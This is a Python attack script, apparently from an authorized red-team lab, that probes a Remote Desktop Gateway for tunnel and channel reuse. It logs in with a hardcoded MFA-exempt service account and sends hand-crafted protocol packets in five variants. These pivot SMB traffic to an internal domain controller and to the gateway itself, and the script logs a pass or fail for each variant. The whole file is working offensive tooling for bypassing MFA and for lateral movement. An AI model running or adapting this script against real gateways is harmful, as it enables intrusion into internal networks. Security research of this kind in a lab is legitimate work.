#!/usr/bin/env python3
"""Same-TLS tunnel-reuse probe (authorized lab: ECORP RDG rig).

svcaccount is Duo-exempt -> zero pushes; this maps what the gateway's HTTP
transport tolerates on ONE TLS leg pair, independent of MFA:

  A: tunnel -> channel -> CLOSE_CHANNEL -> CHANNEL_CREATE #2 (re-channel after clean close)
  B: tunnel -> channel -> CHANNEL_CREATE #2 while #1 open (session-3 said ignored; control)
  C: tunnel -> channel -> CLOSE_CHANNEL -> TUNNEL_CLOSE -> fresh HANDSHAKE + TUNNEL_CREATE #2
  D: tunnel (no channel) -> second TUNNEL_CREATE without closing
  E: two interleaved channels (channel #1 to .40:445, then #2 to .47:445, both live)

Each variant on a fresh RDGTunnel (fresh TLS pair). Verdict per variant logged.
"""
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/kali/workspace/RDetour")
from rdetour import RDGTunnel, pkt, u32, smb2_negotiate  # noqa: E402

GW = "ecorp-rds.ecorp.local"
T1 = ("192.168.15.40", 445)   # DC
T2 = ("192.168.15.47", 445)   # gateway itself
REPORT = []


def fresh(tag):
    print(f"\n=== {tag}: fresh tunnel ===", flush=True)
    t = RDGTunnel(GW, user="svcaccount", password="svcaccount",
                  domain="ECORP.local", verbose=True, connect_timeout=10)
    t.establish(auth_timeout=8)
    print(f"[{tag}] tunnel authorized", flush=True)
    return t


def channel(t, host, port, tag, timeout=25):
    t._channel_create(host, port, protocol=3)
    print(f"[{tag}] channel up {host}:{port}", flush=True)
    return True


def smb_roundtrip(t, tag, timeout=10):
    t.write(smb2_negotiate())
    p = t.recv_packet(timeout=timeout)
    if p is None:
        print(f"[{tag}] no data response", flush=True)
        return False
    body = p[1][2:2 + struct.unpack("<H", p[1][:2])[0]] if p[0] == 0xA else b""
    ok = body[:4] == b"\xfeSMB"
    print(f"[{tag}] data plane {'OK (SMB2 magic)' if ok else 'BAD: ' + body[:16].hex()}", flush=True)
    return ok


def close_channel(t, tag, reason=0):
    t.send_packet(pkt(0x10, u32(reason)))   # CLOSE_CHANNEL
    p = t.recv_packet(timeout=8)
    print(f"[{tag}] close-channel reply: {p and hex(p[0])} body={p and p[1].hex()}", flush=True)
    return p


def tunnel_close(t, tag):
    t.send_packet(pkt(0x12))                # TUNNEL_CLOSE
    p = t.recv_packet(timeout=8)
    print(f"[{tag}] tunnel-close reply: {p and hex(p[0])} body={p and p[1].hex()}", flush=True)
    return p


def second_create(t, tag):
    t.send_packet(pkt(0x1, b"\x01\x00" + struct.pack("<HH", 0, 0)))  # HANDSHAKE
    p = t.recv_packet(timeout=8)
    print(f"[{tag}] handshake#2: {p and hex(p[0])} body={p and p[1].hex()}", flush=True)
    if p is None or p[0] != 0x2:
        return False
    t.send_packet(pkt(0x4, u32(0x1 | 0x4 | 0x8) + struct.pack("<HHH", 0, 0, 0)))
    p = t.recv_packet(timeout=8)
    print(f"[{tag}] tunnel-create#2: {p and hex(p[0])} body={p and p[1].hex()}", flush=True)
    if p is None or p[0] != 0x5:
        return False
    err = struct.unpack("<I", p[1][2:6])[0]
    print(f"[{tag}] tunnel-create#2 hresult 0x{err:08x}", flush=True)
    return err == 0


def channel_create2(t, host, port, tag):
    name = host.encode("utf-16-le") + b"\x00\x00"
    t.send_packet(pkt(0x8, b"\x01\x00" + struct.pack("<HHH", port, 3, len(name)) + name))
    p = t.recv_packet(timeout=25)
    print(f"[{tag}] channel-create#2 ({host}:{port}): pkt={p and hex(p[0])} body={p and p[1].hex()}", flush=True)
    if p is None or p[0] != 0x9:
        return False
    return struct.unpack("<I", p[1][0:4])[0] == 0


def verdict(tag, ok, note=""):
    REPORT.append((tag, ok, note))
    print(f">>> {tag}: {'PASS' if ok else 'FAIL'} {note}", flush=True)


def run():
    # A: re-channel after clean CLOSE_CHANNEL
    try:
        t = fresh("A")
        channel(t, *T1, "A")
        smb_roundtrip(t, "A")
        close_channel(t, "A")
        ok = channel_create2(t, *T2, "A") and smb_roundtrip(t, "A2")
        verdict("A re-channel after close", ok)
        t.close()
    except Exception as e:
        verdict("A re-channel after close", False, repr(e))

    # B: second CHANNEL_CREATE while #1 live (control; session-3 = ignored)
    try:
        t = fresh("B")
        channel(t, *T1, "B")
        smb_roundtrip(t, "B")
        ok = channel_create2(t, *T2, "B")
        verdict("B channel#2 while #1 live", ok, "(server did respond 0x9)" if ok else "(ignored/denied as before)")
        t.close()
    except Exception as e:
        verdict("B channel#2 while #1 live", False, repr(e))

    # C: full close then fresh handshake+tunnel on same TLS pair
    try:
        t = fresh("C")
        channel(t, *T1, "C")
        smb_roundtrip(t, "C")
        close_channel(t, "C")
        tunnel_close(t, "C")
        time.sleep(1)
        ok = second_create(t, "C")
        if ok:
            # try tunnel-auth + channel + data to prove usable
            t.send_packet(pkt(0x6, struct.pack("<HH", 0, 0)))  # empty name auth
            p = t.recv_packet(timeout=8)
            print(f"[C] tunnel-auth#2: {p and hex(p[0])} body={p and p[1].hex()}", flush=True)
            ok = p is not None and p[0] == 0x7 and struct.unpack("<I", p[1][:4])[0] == 0
            if ok:
                ok = channel_create2(t, *T2, "C") and smb_roundtrip(t, "C2")
        verdict("C sequential tunnel same TLS", ok)
        t.close()
    except Exception as e:
        verdict("C sequential tunnel same TLS", False, repr(e))

    # D: second TUNNEL_CREATE without any close
    try:
        t = fresh("D")
        t.send_packet(pkt(0x4, u32(0x1 | 0x4 | 0x8) + struct.pack("<HHH", 0, 0, 0)))
        p = t.recv_packet(timeout=8)
        ok = p is not None and p[0] == 0x5 and struct.unpack("<I", p[1][2:6])[0] == 0
        print(f"[D] bare tunnel-create#2: pkt={p and hex(p[0])} body={p and p[1].hex()}", flush=True)
        verdict("D stacked TUNNEL_CREATE", ok)
        t.close()
    except Exception as e:
        verdict("D stacked TUNNEL_CREATE", False, repr(e))

    # E: interleaved: chan#1 .40:445, chan#2 .47:445, read on both
    try:
        t = fresh("E")
        channel(t, *T1, "E")
        ok2 = channel_create2(t, *T2, "E")
        smb_roundtrip(t, "E")
        verdict("E interleaved channels", ok2)
        t.close()
    except Exception as e:
        verdict("E interleaved channels", False, repr(e))

    print("\n===== SUMMARY =====", flush=True)
    for tag, ok, note in REPORT:
        print(f"  {'PASS' if ok else 'FAIL':4}  {tag} {note}", flush=True)


if __name__ == "__main__":
    socket.setdefaulttimeout(15)
    run()
